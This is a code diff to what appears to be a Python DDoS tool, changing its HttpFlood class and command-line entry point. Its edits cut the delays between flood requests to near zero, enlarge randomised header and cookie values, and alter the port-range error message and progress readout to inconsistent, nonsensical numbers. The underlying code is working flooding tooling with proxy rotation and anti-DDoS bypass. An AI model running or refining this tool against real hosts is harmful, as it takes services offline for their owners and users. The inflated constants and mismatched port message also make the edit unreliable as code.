@@ -748,7 +748,7 @@ class HttpFlood(Thread):
             " _gat=1;"
             " __cfduid=dc232334gwdsd23434542342342342475611928;"
             " %s=%s\r\n" %
-            (ProxyTools.Random.rand_int(1000, 99999), ProxyTools.Random.rand_str(6),
+            (ProxyTools.Random.rand_int(10000000000, 999999999999999999999), ProxyTools.Random.rand_str(6),
              ProxyTools.Random.rand_str(32)))
         s = None
         with suppress(Exception), self.open_connection() as s:
@@ -883,7 +883,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                sleep(max(self._rpc / 1000, 1))
+                sleep(max(self._rpc / 1000000000000000000, 1))
                 Tools.send(s, payload)
         Tools.safe_close(s)
 
@@ -894,7 +894,7 @@ class HttpFlood(Thread):
                 pro = randchoice(self._proxies)
                 with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents), pro.asRequest()) as ss:
                     for _ in range(min(self._rpc, 5)):
-                        sleep(min(self._rpc, 5) / 100)
+                        sleep(min(self._rpc, 5) / 10000000000000000000000)
                         with ss.get(self._target.human_repr(),
                                     proxies=pro.asRequest()) as res:
                             REQUESTS_SENT += 1
@@ -905,7 +905,7 @@ class HttpFlood(Thread):
 
             with Tools.dgb_solver(self._target.human_repr(), randchoice(self._useragents)) as ss:
                 for _ in range(min(self._rpc, 5)):
-                    sleep(min(self._rpc, 5) / 100)
+                    sleep(min(self._rpc, 5) / 10000000000000000000000000)
                     with ss.get(self._target.human_repr()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
@@ -1091,7 +1091,7 @@ class HttpFlood(Thread):
                 Tools.send(s, payload)
             while Tools.send(s, payload) and s.recv(1):
                 for i in range(self._rpc):
-                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
+                    keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 500000000))
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
                     break
@@ -1584,7 +1584,7 @@ if __name__ == '__main__':
                     exit('Cannot resolve hostname ', url.host, e)
 
                 if port > 65535 or port < 1:
-                    exit("Invalid Port [Min: 1 / Max: 65535] ")
+                    exit("Invalid Port [Min: 1 / Max: 655999935] ")
 
                 if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD", "SYN", "ICMP"} and \
                         not ToolsConsole.checkRawSocket():
@@ -1647,7 +1647,7 @@ if __name__ == '__main__':
                      method,
                      Tools.humanformat(int(REQUESTS_SENT)),
                      Tools.humanbytes(int(BYTES_SEND)),
-                     round((time() - ts) / timer * 100, 2)))
+                     round((time() - ts) / timer * 1000000000, 2)))
                 REQUESTS_SENT.set(0)
                 BYTES_SEND.set(0)
                 sleep(1)
